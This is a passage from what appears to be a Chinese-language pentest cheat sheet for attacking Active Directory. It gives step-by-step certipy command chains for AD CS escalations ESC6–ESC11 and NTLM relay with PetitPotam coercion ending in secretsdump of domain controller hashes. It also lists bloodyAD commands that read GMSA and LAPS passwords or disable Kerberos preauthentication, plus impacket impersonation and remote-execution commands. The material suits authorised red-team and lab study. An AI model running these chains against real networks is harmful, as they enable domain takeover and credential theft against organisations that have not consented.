<h5 id="ESC6：EDITF-ATTRIBUTESUBJECTALTNAME2"><a href="#ESC6：EDITF-ATTRIBUTESUBJECTALTNAME2" class="headerlink" title="ESC6：EDITF_ATTRIBUTESUBJECTALTNAME2"></a>ESC6：EDITF_ATTRIBUTESUBJECTALTNAME2</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy find -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -vulnerable -dc-ip &lt;RHOST&gt; -<span class="hljs-built_in">stdout</span><br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template User -upn administrator@&lt;DOMAIN&gt;<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username administrator@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template User -upn administrator@&lt;DOMAIN&gt;<br>certipy auth -pfx administrator.pfx -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ESC7：脆弱的证书颁发机构访问控制"><a href="#ESC7：脆弱的证书颁发机构访问控制" class="headerlink" title="ESC7：脆弱的证书颁发机构访问控制"></a>ESC7：脆弱的证书颁发机构访问控制</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy ca -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -add-officer &lt;USERNAME&gt; -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt;<br>certipy ca -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -enable-template SubCA -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt;<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -template SubCA -upn administrator@&lt;DOMAIN&gt;<br>certipy ca -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -issue-request &lt;ID&gt; -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt;<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -target &lt;CA&gt; -retrieve &lt;ID&gt;<br>certipy auth -pfx administrator.pfx -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ESC8：NTLM-中继到-AD-CS-HTTP-端点"><a href="#ESC8：NTLM-中继到-AD-CS-HTTP-端点" class="headerlink" title="ESC8：NTLM 中继到 AD CS HTTP 端点"></a>ESC8：NTLM 中继到 AD CS HTTP 端点</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy relay -target <span class="hljs-string">&#x27;http://&lt;CA&gt;&#x27;</span><br>certipy relay -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -template &lt;TEMPLATE&gt;<br>python3 PetitPotam.py &lt;RHOST&gt; &lt;DOMAIN&gt;<br>certipy auth -pfx dc.pfx -dc-ip &lt;RHOST&gt;<br>export KRB5CCNAME=dc.ccache<br>impacket-secretsdump -k -no-pass &lt;DOMAIN&gt;/<span class="hljs-string">&#x27;dc$&#x27;</span>@&lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h6 id="中继攻击过程"><a href="#中继攻击过程" class="headerlink" title="中继攻击过程"></a>中继攻击过程</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-ntlmrelayx -t http:<span class="hljs-comment">//&lt;RHOST&gt;/certsrv/certfnsh.asp -smb2support --adcs --template &lt;TEMPLATE&gt;</span><br>python3 PetitPotam.py &lt;RHOST&gt; &lt;DOMAIN&gt;<br>python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span>/<span class="hljs-string">&#x27;dc$&#x27;</span> <span class="hljs-string">&#x27;dc.ccache&#x27;</span><br>export KRB5CCNAME=dc.ccache<br>impacket-secretsdump -k -no-pass &lt;DOMAIN&gt;/<span class="hljs-string">&#x27;dc$&#x27;</span>@&lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ESC9：无安全扩展"><a href="#ESC9：无安全扩展" class="headerlink" title="ESC9：无安全扩展"></a>ESC9：无安全扩展</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy shadow <span class="hljs-keyword">auto</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -account &lt;USERNAME&gt;<br>certipy account update -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -user &lt;USERNAME&gt; -upn Administrator<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt; -hashes <span class="hljs-number">54296</span>a48cd30259cc88095373cec24da -template &lt;TEMPLATE&gt;<br>certipy account update -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -user &lt;USERNAME&gt; -upn &lt;USERNAME&gt;@&lt;DOMAIN&gt;<br>certipy auth -pfx administrator.pfx -domain &lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h5 id="ESC10：弱证书映射"><a href="#ESC10：弱证书映射" class="headerlink" title="ESC10：弱证书映射"></a>ESC10：弱证书映射</h5><h6 id="情况1"><a href="#情况1" class="headerlink" title="情况1"></a>情况1</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy shadow <span class="hljs-keyword">auto</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -account &lt;USERNAME&gt;<br>certipy account update -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -user &lt;USERNAME&gt; -upn Administrator<br>certipy req -ca <span class="hljs-string">&#x27;&lt;CA&gt;&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -hashes a87f3a337d73085c45f9416be5787d86<br>certipy account update -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -user &lt;USERNAME -upn &lt;USERNAME&gt;@&lt;DOMAIN&gt;<br>certipy auth -pfx administrator.pfx -domain &lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h6 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy shadow <span class="hljs-keyword">auto</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -account &lt;USERNAME&gt;<br>certipy account update -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -user &lt;USERNAME&gt; -upn <span class="hljs-string">&#x27;DC$@&lt;DOMAIN&gt;&#x27;</span><br>certipy req -ca <span class="hljs-string">&#x27;CA&#x27;</span> -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password -hashes a87f3a337d73085c45f9416be5787d86<br>certipy account update -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -user &lt;USERNAME -upn &lt;USERNAME&gt;@&lt;DOMAIN&gt;<br>certipy auth -pfx dc.pfx -dc-ip &lt;RHOST&gt; -ldap-shell<br></code></pre></td></tr></table></figure>

<h5 id="ESC11：IF-ENFORCEENCRYPTICERTREQUEST"><a href="#ESC11：IF-ENFORCEENCRYPTICERTREQUEST" class="headerlink" title="ESC11：IF_ENFORCEENCRYPTICERTREQUEST"></a>ESC11：IF_ENFORCEENCRYPTICERTREQUEST</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy relay -target <span class="hljs-string">&#x27;rpc://&lt;CA&gt;&#x27;</span> -ca <span class="hljs-string">&#x27;CA&#x27;</span><br>certipy auth -pfx administrator.pfx -domain &lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h4 id="ADCS模板"><a href="#ADCS模板" class="headerlink" title="ADCS模板"></a>ADCS模板</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Import-Module .\ADCSTemplate.psm1<br>New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName <span class="hljs-string">&#x27;Subordinate Certification Authority&#x27;</span>) -AutoEnroll -Publish -Identity <span class="hljs-string">&#x27;&lt;DOMAIN&gt;\Domain Users&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="管理员管理器"><a href="#管理员管理器" class="headerlink" title="管理员管理器"></a>管理员管理器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">AD-miner -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -cf &lt;NAME&gt;<br></code></pre></td></tr></table></figure>

<h4 id="寻血猎犬-bloodhound"><a href="#寻血猎犬-bloodhound" class="headerlink" title="寻血猎犬 - bloodhound"></a>寻血猎犬 - bloodhound</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo apt-get <span class="hljs-keyword">install </span>openjdk<span class="hljs-number">-11</span>-<span class="hljs-keyword">jdk</span><br><span class="hljs-keyword"></span>pip <span class="hljs-keyword">install </span><span class="hljs-keyword">bloodhound</span><br><span class="hljs-keyword"></span>sudo apt-get <span class="hljs-keyword">install </span>neo4j<br>sudo apt-get <span class="hljs-keyword">install </span><span class="hljs-keyword">bloodhound</span><br></code></pre></td></tr></table></figure>

<h5 id="安装并启动数据库"><a href="#安装并启动数据库" class="headerlink" title="安装并启动数据库"></a>安装并启动数据库</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">wget -O - https:<span class="hljs-comment">//debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -</span><br>sudo echo <span class="hljs-string">&#x27;deb https://debian.neo4j.com stable 4.0&#x27;</span> &gt; /etc/apt/sources.<span class="hljs-built_in">list</span>.d/neo4j.<span class="hljs-built_in">list</span><br>sudo apt-get update<br>sudo apt-get install apt-transport-https<br>sudo apt-get install neo4j<br>systemctl start neo4j<br>./bloodhound --no-sandbox<br></code></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost:7474/browser/">http://localhost:7474/浏览器/</a></p>
</blockquote>
<h6 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">docker run -itd -p <span class="hljs-number">7687</span>:<span class="hljs-number">7687</span> -p <span class="hljs-number">7474</span>:<span class="hljs-number">7474</span> --env NEO4J_AUTH=neo4j/&lt;PASSWORD&gt; -v $(pwd)/neo4j:/data neo4j:<span class="hljs-number">4.4</span>-community<br></code></pre></td></tr></table></figure>

<h5 id="数据库密码重置"><a href="#数据库密码重置" class="headerlink" title="数据库密码重置"></a>数据库密码重置</h5><blockquote>
<p><a target="_blank" rel="noopener" href="http://localhost:7474/browser/">http://localhost:7474/浏览器/</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ALTER USER neo4j SET PASSWORD <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span><br></code></pre></td></tr></table></figure>

<h4 id="寻血猎犬蟒蛇-bloodhound-python"><a href="#寻血猎犬蟒蛇-bloodhound-python" class="headerlink" title="寻血猎犬蟒蛇 - bloodhound-python"></a>寻血猎犬蟒蛇 - bloodhound-python</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">bloodhound-python -u <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -p <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -d <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span> -gc <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span>-ns &lt;RHOST&gt; -c all --zip<br>bloodhound-python -u <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -p <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -d <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span> -dc <span class="hljs-string">&#x27;&lt;RHOST&gt;&#x27;</span> -ns &lt;RHOST&gt; -c all --zip<br>bloodhound-python -u <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -p <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -d <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span> -ns &lt;RHOST&gt; --dns-tcp -no-pass -c ALL --zip<br>bloodhound-python -u <span class="hljs-string">&#x27;&lt;USERNAME&gt;&#x27;</span> -p <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -d <span class="hljs-string">&#x27;&lt;DOMAIN&gt;&#x27;</span> -dc <span class="hljs-string">&#x27;&lt;RHOST&gt;&#x27;</span> -ns &lt;RHOST&gt; --dns-tcp -no-pass -c ALL --zip<br></code></pre></td></tr></table></figure>

<h4 id="bloodyAD-工具"><a href="#bloodyAD-工具" class="headerlink" title="bloodyAD 工具"></a>bloodyAD 工具</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object Users --attr member                                        <span class="hljs-comment">// 获取组成员</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object <span class="hljs-string">&#x27;DC=&lt;DOMAIN&gt;,DC=local&#x27;</span> --attr minPwdLength                 <span class="hljs-comment">// 获取最小密码长度策略</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object <span class="hljs-string">&#x27;DC=&lt;DOMAIN&gt;,DC=local&#x27;</span> --attr msDS-Behavior-Version        <span class="hljs-comment">// Get AD functional level</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get children <span class="hljs-string">&#x27;DC=&lt;DOMAIN&gt;,DC=local&#x27;</span> --type user                       <span class="hljs-comment">// Get all users of the domain</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get children <span class="hljs-string">&#x27;DC=&lt;DOMAIN&gt;,DC=local&#x27;</span> --type computer                   <span class="hljs-comment">// Get all computers of the domain</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get children <span class="hljs-string">&#x27;DC=&lt;DOMAIN&gt;,DC=local&#x27;</span> --type container                  <span class="hljs-comment">// Get all containers of the domain</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; add uac &lt;USERNAME&gt; DONT_REQ_PREAUTH                                   <span class="hljs-comment">// Enable DONT_REQ_PREAUTH for ASREPRoast</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; remove uac &lt;USERNAME&gt; ACCOUNTDISABLE                                  <span class="hljs-comment">// Disable ACCOUNTDISABLE</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object &lt;USERNAME&gt; --attr userAccountControl                       <span class="hljs-comment">// Get UserAccountControl flags</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object <span class="hljs-string">&#x27;&lt;OBJECT&gt;$&#x27;</span> --attr msDS-ManagedPassword                    <span class="hljs-comment">// Read GMSA account password</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object <span class="hljs-string">&#x27;&lt;OBJECT&gt;$&#x27;</span> --attr ms-Mcs-AdmPwd                           <span class="hljs-comment">// Read LAPS password</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get object <span class="hljs-string">&#x27;DC=&lt;DOMAIN&gt;,DC=local&#x27;</span> --attr ms-DS-MachineAccountQuota    <span class="hljs-comment">// Read quota for adding computer objects to domain</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; add dnsRecord &lt;RECORD&gt; &lt;LHOST&gt;                                        <span class="hljs-comment">// Add a new DNS entry</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; remove dnsRecord &lt;RECORD&gt; &lt;LHOST&gt;                                     <span class="hljs-comment">// Remove a DNS entry</span><br>bloodyAD -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -d &lt;DOMAIN&gt; --host &lt;RHOST&gt; get dnsDump                                                           <span class="hljs-comment">// Get AD DNS records</span><br></code></pre></td></tr></table></figure>

<h4 id="Certify"><a href="#Certify" class="headerlink" title="Certify"></a>Certify</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">https://github.com/GhostPack/Certify</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Certify find /vulnerable<br>.\Certify.exe find /vulnerable /currentuser<br></code></pre></td></tr></table></figure>

<h4 id="certipy-工具"><a href="#certipy-工具" class="headerlink" title="certipy 工具"></a>certipy 工具</h4><p>参考地址： <a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a><br>参考地址：  <a target="_blank" rel="noopener" href="https://github.com/ly4k/BloodHound/">https://github.com/ly4k/BloodHound/</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy find -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;<br>certipy find -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -vulnerable -<span class="hljs-built_in">stdout</span><br></code></pre></td></tr></table></figure>

<h5 id="创建账户"><a href="#创建账户" class="headerlink" title="创建账户"></a>创建账户</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy account create -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -dc-ip &lt;RHOST&gt; -dns &lt;DOMAIN_CONTROLLER_DNS_NAME&gt; -user &lt;COMPUTERNAME&gt;<br></code></pre></td></tr></table></figure>

<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy auth -pfx &lt;FILE&gt;.pfx -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt; -domain &lt;DOMAIN&gt;<br></code></pre></td></tr></table></figure>

<h6 id="LDAP-Shell"><a href="#LDAP-Shell" class="headerlink" title="LDAP-Shell"></a>LDAP-Shell</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy auth -pfx &lt;FILE&gt;.pfx -dc-ip &lt;RHOST&gt; -u &lt;USERNAME&gt; -domain &lt;DOMAIN&gt; -ldap-shell<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"># add_user &lt;USERNAME&gt;<br># add_user_to_group &lt;GROUP&gt;<br></code></pre></td></tr></table></figure>

<h5 id="证书伪造"><a href="#证书伪造" class="headerlink" title="证书伪造"></a>证书伪造</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy template -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -template Web -dc-ip &lt;RHOST&gt; -save-old<br></code></pre></td></tr></table></figure>

<h5 id="证书申请"><a href="#证书申请" class="headerlink" title="证书申请"></a>证书申请</h5><p>由于当前存在问题，请运行以下命令两次<code>certipy</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy req -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -ca &lt;CA&gt; -target &lt;FQDN&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy req -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -ca &lt;CA&gt; -target &lt;FQDN&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt; -upn &lt;USERNAME&gt;@&lt;DOMAIN&gt; -dns &lt;FQDN&gt;<br>certipy req -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -ca &lt;CA&gt; -target &lt;FQDN&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt; -upn &lt;USERNAME&gt;@&lt;DOMAIN&gt; -dns &lt;FQDN&gt; -debug<br></code></pre></td></tr></table></figure>

<h5 id="恢复更改"><a href="#恢复更改" class="headerlink" title="恢复更改"></a>恢复更改</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">certipy template -username &lt;USERNAME&gt;@&lt;DOMAIN&gt; -password &lt;PASSWORD&gt; -template &lt;TEMPLATE&gt; -dc-ip &lt;RHOST&gt; -configuration &lt;TEMPLATE&gt;.json<br></code></pre></td></tr></table></figure>

<h5 id="启动-BloodHound-叉子"><a href="#启动-BloodHound-叉子" class="headerlink" title="启动 BloodHound 叉子"></a>启动 BloodHound 叉子</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./BloodHound --disable-gpu-sandbox<br></code></pre></td></tr></table></figure>

<h4 id="enum4linux-ng"><a href="#enum4linux-ng" class="headerlink" title="enum4linux-ng"></a>enum4linux-ng</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">enum4linux-ng -A &lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<h4 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">evil-winrm -i &lt;RHOST&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt;<br>evil-winrm -i &lt;RHOST&gt; -c /PATH/TO/CERTIFICATE/&lt;CERTIFICATE&gt;.crt -k /PATH/TO/PRIVATE/KEY/&lt;KEY&gt;.key -p -u -S<br></code></pre></td></tr></table></figure>

<h4 id="Impakcet-工具包"><a href="#Impakcet-工具包" class="headerlink" title="Impakcet 工具包"></a>Impakcet 工具包</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-atexec -k -no-pass &lt;DOMAIN&gt;/Administrator@&lt;DOMAIN_CONTROLLER&gt;.&lt;DOMAIN&gt; <span class="hljs-string">&#x27;type C:\PATH\TO\FILE\&lt;FILE&gt;&#x27;</span><br>impacket-GetADUsers -all -dc-ip &lt;RHOST&gt; &lt;DOMAIN&gt;/<br>impacket-getST &lt;DOMAIN&gt;/&lt;USERNAME&gt;$ -spn WWW/&lt;DOMAIN_CONTROLLER&gt;.&lt;DOMAIN&gt; -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator<br>impacket-lookupsid &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;<br>impacket-netview &lt;DOMAIN&gt;/&lt;USERNAME&gt; -targets /PATH/TO/FILE/&lt;FILE&gt;.txt -users /PATH/TO/FILE/&lt;FILE&gt;.txt<br>impacket-reg &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD:PASSWORD_HASH&gt;@&lt;RHOST&gt; &lt;ACTION&gt; &lt;ACTION&gt;<br>impacket-rpcdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;<br>impacket-samrdump &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;<br>impacket-services &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt; &lt;ACTION&gt;<br>impacket-smbpasswd &lt;RHOST&gt;/&lt;USERNAME&gt;:<span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span>@&lt;RHOST&gt; -newpass <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span><br>impacket-smbserver local . -smb2support<br></code></pre></td></tr></table></figure>

<h5 id="IMPACKET-SMBCLIENT"><a href="#IMPACKET-SMBCLIENT" class="headerlink" title="IMPACKET-SMBCLIENT"></a>IMPACKET-SMBCLIENT</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-smbclient &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD/PASSWORD_HASH&gt;@&lt;RHOST&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">export KRB5CCNAME=&lt;USERNAME&gt;.ccache<br>impacket-smbclient -k &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;RHOST&gt;.&lt;DOMAIN&gt; -no-pass<br></code></pre></td></tr></table></figure>

